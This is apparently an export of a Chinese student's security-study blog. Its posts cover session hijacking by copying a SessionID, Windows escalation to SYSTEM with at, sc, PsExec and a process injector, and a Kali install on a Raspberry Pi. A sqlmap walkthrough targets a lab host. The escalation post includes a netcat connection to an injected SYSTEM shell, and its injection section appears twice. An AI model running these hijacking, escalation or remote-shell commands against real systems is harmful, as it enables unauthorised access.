<p>下面是怎么拿到SessionID<br><strong>下面是我常使用火狐浏览器的组件</strong><br>在添加火狐浏览器组件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091319030410.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913190315366.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913190324646.png" alt="在这里插入图片描述"><br>已经登陆成功过的过的SessionID（赛神爱低）<br>点击刚才下载好的组件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913190645137.png" alt="在这里插入图片描述"><br>选择已经登陆的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913190802292.png" alt="在这里插入图片描述"><br>就可以看见SessionID（赛神爱低）<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913190843123.png" alt="在这里插入图片描述"><br>复制出来后就可以吧浏览器退出了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913190957368.png" alt="在这里插入图片描述"></p>
<h2 id="利用SessionID进行登录"><a href="#利用SessionID进行登录" class="headerlink" title="利用SessionID进行登录"></a>利用SessionID进行登录</h2><p>下面是导入SessionID（赛神爱低）进行没有账号密码登陆<br>可以看到是要输入账号密码的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913191358248.png" alt="在这里插入图片描述"><br>霸SessionID（赛神爱低）导入到浏览器里<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091319161586.png" alt="在这里插入图片描述">要修改的SessionID（赛神爱低）的网页<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913191714919.png" alt="在这里插入图片描述"><br>叫上面已经复制好的SessionID（赛神爱低）粘贴到红色圈主的里面然后保存<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091319193250.png" alt="在这里插入图片描述"><br>然后出现输入地址发现就直接进到里面去了没有身份验证<br>这样在服务器看来就是已经身份认证过的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913192033388.png" alt="在这里插入图片描述"></p>
<h2 id="SessionID（赛神爱低）生成算法"><a href="#SessionID（赛神爱低）生成算法" class="headerlink" title="SessionID（赛神爱低）生成算法"></a>SessionID（赛神爱低）生成算法</h2><p>SessionID（赛神爱低）如果重复性很大和算法能算出来的话那么就是非常不安全的,下一个SessionID（赛神爱低）有可能就会算出来，从而拿到权限。<br>建议用常用的算法应为常用的算法都是经过验证的，有的人自己觉得自己设计的算法生成的SessionID（赛神爱低）可靠的其实不然，现在直流的算法都是经过许多年和许多安全测试人员测试过不安全 加密算法都已经淘汰掉。<br>BurpSuite工具就可以测试算法，这个前面的笔记我写过应为发不出来所以就不在这个写了<br>密码找回</p>
<p><a href="https://www.example.com/resetemail=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514">https://www.example.com/resetemail=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514</a><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914111950482.png" alt="在这里插入图片描述"><br>如果这个邮箱直接是SHA25密文后面的随机值是可以计算的然后以输入地址就可以修改密码这不就完了吗</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>手动挖掘漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透阶段Windows系统提权</title>
    <url>/2021/08/28/1.%E6%9C%AC%E5%9C%B0%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>学习总结</p>
</div>

<h2 id="系统权限分类"><a href="#系统权限分类" class="headerlink" title="系统权限分类"></a>系统权限分类</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>net user 用户名</code>查看一下当前用户权限<br>下面我有一个zhao的用户在Administrator组里面<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/20201101104422.png"></p>
<h4 id="1-user普通用户权限来宾权限"><a href="#1-user普通用户权限来宾权限" class="headerlink" title="1. user普通用户权限来宾权限"></a>1. user普通用户权限来宾权限</h4><p>他的无法更改系bai统属性和配置,只作来宾临时使用</p>
<h4 id="2-Administrator超级管理员"><a href="#2-Administrator超级管理员" class="headerlink" title="2. Administrator超级管理员"></a>2. Administrator超级管理员</h4><p>Administrator超级管理员都是他用的注册表和其他的文件是不能修改删除的  他可以修改一切user普通用户</p>
<h4 id="3-system内核级账号"><a href="#3-system内核级账号" class="headerlink" title="3. system内核级账号"></a>3. system内核级账号</h4><p>system才算是windows系统里面的最高权限，但是system有的Administrator权限也是不能操作的<br>下面是比如的权限管理范围<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101100948.png"></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="1-user普通用户权限来宾权限-1"><a href="#1-user普通用户权限来宾权限-1" class="headerlink" title="1. user普通用户权限来宾权限"></a>1. user普通用户权限来宾权限</h4><p>他就是个普通权限的账号</p>
<h4 id="2-root最高权限"><a href="#2-root最高权限" class="headerlink" title="2. root最高权限"></a>2. root最高权限</h4><p>他是系统最高权限什么都可以做，就相当于win系统的Administrator加system</p>
<h2 id="XP用at命令Administrator提权到system"><a href="#XP用at命令Administrator提权到system" class="headerlink" title="XP用at命令Administrator提权到system"></a>XP用<code>at</code>命令Administrator提权到system</h2><p>win7里面不能使用了</p>
<p>格式<br>at 指定的时间  /interactive  cmd</p>
<p>咧<br>命令</p>
<p>下面命令的意思是在10:59启动一个cmd<br>/interactive 是允许作业在运行时，与当时登录的用户桌面进行交互</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at 10:59  &#x2F;interactive  cmd</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101105849.png"></p>
<p>时间到了他就会启动一个system权限的cmd<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101105938.png"></p>
<p>查看一下cmd权限已经是system权限了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101110412.png"></p>
<p>我们在用这个system权限的cmd启动任务管理器<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">taskmgr</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101111821.png"><br>然后在叫explorer.exe程序杀死<br>explorer程序是桌面和文件管理，杀死后桌面无法启动<br>可以看见下面已经没有桌面了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101112437.png"></p>
<p>然后在用启动任务管理器来启动explorer他</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101112822.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101112913.png"><br>或者是直接在cmd里面输入explorer<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101114238.png"></p>
<p>等一会桌面就出来了<br>整个桌面就是system权限的了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101114322.png"></p>
<h2 id="用sc命令Administrator提权到system"><a href="#用sc命令Administrator提权到system" class="headerlink" title="用sc命令Administrator提权到system"></a>用sc命令Administrator提权到system</h2><p>sc命令可以编辑修改添加系统服务<br>原理就是服务都是system权限启动的<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc Create syscmdbinPath&#x3D; &quot;cmd&#x2F;K start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure>
<p><code>Create</code>是创建一个名字是<code>syscmd</code>可以随便起<br><code>binPath</code>执行一个命令是<code>cmd/K start</code>,<br><code>cmd/K start</code>命令就是重新启动一个cmd的窗口<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101161258.png"></p>
<p><code>type=own</code>是服务的类型<code>own</code>,<code>own</code>就是现在的用户拥有的<br><code>type= interact</code>服务的类型是<code>interact</code>,interact就是交互的类型不是后台的程序</p>
<p>输入完命令<br>可以看见他已经有这个服务了，但是没有启动,<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101162942.png"><br>可以点击直接启动<br>或者用下面个命令启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure>
<p>访问启动就是cmd，整个cmd就是system权限了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101163741.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101165154.png"></p>
<h2 id="Sysinternals-Suite工具提权"><a href="#Sysinternals-Suite工具提权" class="headerlink" title="Sysinternals Suite工具提权"></a>Sysinternals Suite工具提权</h2><p>Sysinternals Suite这是套件<br>下载地址<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a><br>有很多工具<br>也可以单个下载<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101164343.png"></p>
<p>下载一整个套件<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101164542.png"></p>
<p>解压出来里面有很多的工具<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101165531.png"></p>
<p><strong>提权用到的工具是PsExec.exe</strong><br>提权命令是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PsExec.exe -i -s  cmd</span><br></pre></td></tr></table></figure>
<p><code>-i</code> 运行程序，使其与桌面的交互<br><code>-s</code> 在系统帐户中运行远程进程。</p>
<p>可以看见已经提权到system了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201101170246.png"></p>
<h2 id="什么是注入进程提权"><a href="#什么是注入进程提权" class="headerlink" title="什么是注入进程提权"></a>什么是注入进程提权</h2><p>叫我的进程注入到system账户里面<br>或者是叫system账户进程注入到user普通用户里面<br>管理员非常难发现应为他注入到的是合法进程</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>要翻墙下载地址<a href="http://www.tarasco.org/security/Process_Injector/">http://www.tarasco.org/security/Process_Injector/</a><br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102094227.png"><br>下面的就下载下来保持到了蓝奏云上面地址<a href="https://wwx.lanzoux.com/iWF2lhyvzre">https://wwx.lanzoux.com/iWF2lhyvzre</a></p>
<p>他会误报有病毒<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102095633.png"></p>
<p>他有三个文件那那<code>.c</code>和<code>.h</code>是源码文件，还有一个执行文件<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102100230.png"></p>
<h2 id="他的参数"><a href="#他的参数" class="headerlink" title="他的参数"></a>他的参数</h2><p>执行看一下他的参数<br>他就有两个参数<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/20201102100717.png"></p>
<p><code>-l</code> 是查看可以注入的进行<br><code>-p [PID]  [程序的名]  [端口]</code>就是注入进程，通过这个端口直接就可以用nc连接</p>
<h2 id="实咧"><a href="#实咧" class="headerlink" title="实咧"></a>实咧</h2><p>查看可以注入的进程<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pinjector.exe -l</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/2020-11-02_10-18.png"></p>
<p>进行注入到system账户里面<br>我就随便选一个<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pinjector.exe -p  636 cmd 5555</span><br></pre></td></tr></table></figure>
<p><code>636</code>是注入的PID<br><code>cmd</code>要注入的程序<br><code>5555</code>指定的端口<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102103902.png"><br>可以看到端口已经开启了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102104015.png"></p>
<p>我们就可以在其他电脑上连接上那个提权到system的cmd了<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.31.135 5555</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102104522.png"></p>
<h1 id="什么是注入进程提权-1"><a href="#什么是注入进程提权-1" class="headerlink" title="什么是注入进程提权"></a>什么是注入进程提权</h1><p>叫我的进程注入到system账户里面<br>或者是叫system账户进程注入到user普通用户里面<br>管理员非常难发现应为他注入到的是合法进程</p>
<h2 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h2><p>要翻墙下载地址<a href="http://www.tarasco.org/security/Process_Injector/">http://www.tarasco.org/security/Process_Injector/</a><br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102094227.png"><br>下面的就下载下来保持到了蓝奏云上面地址<a href="https://wwx.lanzoux.com/iWF2lhyvzre">https://wwx.lanzoux.com/iWF2lhyvzre</a></p>
<p>他会误报有病毒<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102095633.png"></p>
<p>他有三个文件那那<code>.c</code>和<code>.h</code>是源码文件，还有一个执行文件<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102100230.png"></p>
<h2 id="他的参数-1"><a href="#他的参数-1" class="headerlink" title="他的参数"></a>他的参数</h2><p>执行看一下他的参数<br>他就有两个参数<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102100717.png"></p>
<p><code>-l</code> 是查看可以注入的进行<br><code>-p [PID]  [程序的名]  [端口]</code>就是注入进程，通过这个端口直接就可以用nc连接</p>
<h2 id="实咧-1"><a href="#实咧-1" class="headerlink" title="实咧"></a>实咧</h2><p>查看可以注入的进程<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pinjector.exe -l</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/2020-11-02_10-18.png"></p>
<p>进行注入到system账户里面<br>我就随便选一个<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pinjector.exe -p  636 cmd 5555</span><br></pre></td></tr></table></figure>
<p><code>636</code>是注入的PID<br><code>cmd</code>要注入的程序<br><code>5555</code>指定的端口<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102103902.png"><br>可以看到端口已经开启了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102104015.png"></p>
<p>我们就可以在其他电脑上连接上那个提权到system的cmd了<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.31.135 5555</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Photo_clone/img/20201102104522.png"></p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派安装kali linux和说明</title>
    <url>/2020/08/09/1.%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kalilinux%E5%92%8C%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>我玩树莓派的经历，自学习网络安全也有好几年了</strong></p>
<p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派</strong>，<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我买的是</p>
<ul>
<li>树莓派4b 4g</li>
<li>32g内存卡和读卡器</li>
<li>电源</li>
<li>壳子</li>
<li>摄像头</li>
</ul>
<h2 id="开始安装kali-linux"><a href="#开始安装kali-linux" class="headerlink" title="开始安装kali linux"></a>开始安装kali linux</h2><p>玩过kali的人，其实在树莓派安装kali很简单的<br>官方下载地址：<a href="https://www.offensive-security.com/kali-linux-arm-images/">https://www.offensive-security.com/kali-linux-arm-images/</a><br><strong>我下载的是这个</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409142019890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成要解压出来，<br>也可以校验一下是否下载时缺少什么吗<br><strong>记得要叫下载好的文件解压出来</strong><br>用win32diskimager工具可以在百度上下载到<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416125004522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="插入树莓派启动即可"><a href="#插入树莓派启动即可" class="headerlink" title="插入树莓派启动即可"></a>插入树莓派启动即可</h2><p>如果没有屏幕，可以插入网线，</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130407849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用Xshell 6工具去连接ssh<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130455310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130544575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接然后输入<strong>账号默认是root密码是toor</strong><br>看一下已经连接上去了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130645277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我就用他默认的源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>运行命令进行更新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  update</span><br><span class="line">apt-get  upgrade</span><br></pre></td></tr></table></figure>
<p>安装远程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt  install xrdp</span><br></pre></td></tr></table></figure>
<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start xrdp</span><br></pre></td></tr></table></figure>
<p>设置开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable  xrdp</span><br></pre></td></tr></table></figure>
<p>连接<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132549991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置中文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132632601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>解决乱码问题</strong><br>乱码是应为缺少字体<br>安装字体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure>



<h2 id="我QQ2737977997"><a href="#我QQ2737977997" class="headerlink" title="我QQ2737977997"></a>我QQ2737977997</h2>]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>2  sqlmap工具详细使用 SQLMAP自动注入头部的修改</title>
    <url>/2019/11/08/2%20%20sqlmap%E5%B7%A5%E5%85%B7%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%20SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E5%A4%B4%E9%83%A8%E7%9A%84%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>学习笔记：任务094：SQLMAP自动注入-REQUEST</p>
<h2 id="请求类型的参数："><a href="#请求类型的参数：" class="headerlink" title="请求类型的参数："></a>请求类型的参数：</h2><pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这些选项可用于指定如何连接到目标URL</span><br><span class="line"></span><br><span class="line">--method&#x3D;method强制使用给定的HTTP方法（例如PUT）</span><br><span class="line"></span><br><span class="line">--data&#x3D;要通过POST发送的数据数据字符串（例如“id&#x3D;1”）</span><br><span class="line"></span><br><span class="line">PARAM-DEL &#x3D; PARA。用于分割参数值的字符（例如&amp;）</span><br><span class="line"></span><br><span class="line">--cookie&#x3D;cookie HTTP cookie头值（例如“PHPSESSID&#x3D;a8d127e…”）</span><br><span class="line"></span><br><span class="line">--cookie del&#x3D;首席运营官。。用于分割cookie值的字符（例如；）</span><br><span class="line"></span><br><span class="line">--加载cookies&#x3D;L包含Netscape&#x2F;wget格式cookies的文件</span><br><span class="line"></span><br><span class="line">--从响应中删除set cookie Ignore set cookie头</span><br><span class="line"></span><br><span class="line">--用户代理&#x3D;代理HTTP用户代理头值</span><br><span class="line"></span><br><span class="line">--基于HTTP用户代理头的移动模拟智能手机</span><br><span class="line"></span><br><span class="line">--随机代理使用随机选择的HTTP用户代理头值</span><br><span class="line"></span><br><span class="line">--host&#x3D;host HTTP主机头值</span><br><span class="line"></span><br><span class="line">--referer&#x3D;referer HTTP referer头值</span><br><span class="line"></span><br><span class="line">-H割台，--hea额外标题（例如“X-Forwarded-For:127.0.0.1”）</span><br><span class="line"></span><br><span class="line">--headers&#x3D;headers额外的headers（例如，“Accept Language:fr\nETag:123”）</span><br><span class="line"></span><br><span class="line">--auth type&#x3D;auth。。HTTP身份验证类型（基本、摘要、NTLM或PKI）</span><br><span class="line"></span><br><span class="line">--auth cred&#x3D;验证。。HTTP身份验证凭据（名称：密码）</span><br><span class="line"></span><br><span class="line">--auth file&#x3D;验证。。HTTP认证PEM证书&#x2F;私钥文件</span><br><span class="line"></span><br><span class="line">--忽略代码&#x3D;IG。。忽略（有问题的）HTTP错误代码（例如401）</span><br><span class="line"></span><br><span class="line">--忽略代理忽略系统默认代理设置</span><br><span class="line"></span><br><span class="line">--忽略重定向忽略重定向尝试</span><br><span class="line"></span><br><span class="line">--忽略超时忽略连接超时</span><br><span class="line"></span><br><span class="line">--proxy&#x3D;proxy使用代理连接到目标URL</span><br><span class="line"></span><br><span class="line">--代理cred&#x3D;PRO代理身份验证凭据（名称：密码）</span><br><span class="line"></span><br><span class="line">--代理文件&#x3D;PRO从文件加载代理列表</span><br><span class="line"></span><br><span class="line">--使用匿名网络</span><br><span class="line"></span><br><span class="line">--tor端口&#x3D;TORPORT设置为非默认代理端口</span><br><span class="line"></span><br><span class="line">--tor type&#x3D;TORTYPE设置为代理类型（HTTP、SOCKS4或SOCKS5（默认值））</span><br><span class="line"></span><br><span class="line">--检查tor检查tor是否正确使用</span><br><span class="line"></span><br><span class="line">--delay&#x3D;每个HTTP请求之间的延迟延迟（秒）</span><br><span class="line"></span><br><span class="line">--timeout&#x3D;超时连接前等待的超时秒数（默认值30）</span><br><span class="line"></span><br><span class="line">--retries&#x3D;连接超时时重试（默认3）</span><br><span class="line"></span><br><span class="line">——给定参数的随机化＝rPARAM随机变化值</span><br><span class="line"></span><br><span class="line">--safe url&#x3D;测试期间要经常访问的SAFEURL url地址</span><br><span class="line"></span><br><span class="line">--安全柱&#x3D;安全将数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--安全要求&#x3D;安全。。从文件加载安全的HTTP请求</span><br><span class="line"></span><br><span class="line">--安全频率&#x3D;安全两次访问给定安全URL之间的测试请求</span><br><span class="line"></span><br><span class="line">--跳过URL编码跳过有效负载数据的URL编码</span><br><span class="line"></span><br><span class="line">--csrf令牌&#x3D;CSR。。用于保存反CSRF令牌的参数</span><br><span class="line"></span><br><span class="line">--csrf url&#x3D;CSRFURL提取反csrf令牌要访问的url地址</span><br><span class="line"></span><br><span class="line">--csrf方法&#x3D;CS。。访问反CSRF令牌页时使用的HTTP方法</span><br><span class="line"></span><br><span class="line">--强制ssl强制使用ssl&#x2F;HTTPS</span><br><span class="line"></span><br><span class="line">--分块使用HTTP分块传输编码（POST）请求</span><br><span class="line"></span><br><span class="line">--hpp使用HTTP参数污染方法</span><br><span class="line"></span><br><span class="line">--eval&#x3D;eval code在请求之前评估提供的Python代码（例如。</span><br><span class="line"></span><br><span class="line">“导入hashlib；id2&#x3D;hashlib.md5（id.hexdigest（）”）</span><br></pre></td></tr></table></figure></code></pre>
<p>SQLMAP是来进行sql注入的是给予http协议的</p>
<h2 id="下面是参数的演示修改头"><a href="#下面是参数的演示修改头" class="headerlink" title="下面是参数的演示修改头"></a>下面是参数的演示修改头</h2><h2 id="参数-–data"><a href="#参数-–data" class="headerlink" title="参数  –data"></a>参数  –data</h2><p>get或post都适用<br>–data里面放变量的<br>数据段:–data</p>
<h2 id="get演示"><a href="#get演示" class="headerlink" title="get演示"></a>get演示</h2><p>URL地址<code>http://172.16.103.128/mutillidae/index.php?page=login.php</code>怎么参数撒不包含sql注入的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191108183521789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要检测有sql注入漏洞参数名称是通过post数据部分进行传输的<br>在这个地方<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191108185811815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>叫上面的参数放到–data里<br>然后进行–dbs扫描<br>–dbs查看你数据管理系统有多少库显示库名<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.103.128&#x2F;mutillidae&#x2F;index.php?page&#x3D;login.php&quot; --data&#x3D;&quot;username&#x3D;1&amp;password&#x3D;1&amp;login-php-submit-button&#x3D;Login&quot; --dbs</span><br></pre></td></tr></table></figure>
